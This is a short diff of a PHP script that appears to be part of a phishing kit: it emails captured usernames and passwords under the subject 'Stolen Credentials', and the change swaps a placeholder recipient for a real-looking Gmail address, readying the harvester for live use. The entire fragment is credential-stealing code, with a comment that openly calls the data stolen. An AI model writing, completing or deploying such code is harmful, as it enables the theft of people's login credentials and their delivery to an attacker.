@@ -9,7 +9,7 @@
   fclose($file);
 
   // Send the stolen credentials to your email address
-  $to = "your_email@example.com";
+  $to = "v91339441@gmail.com";
   $subject = "Stolen Credentials";
   $message = "Username: " . $username . "\n" . "Password: " . $password;
   $headers = "From: hacked_email@example.com";
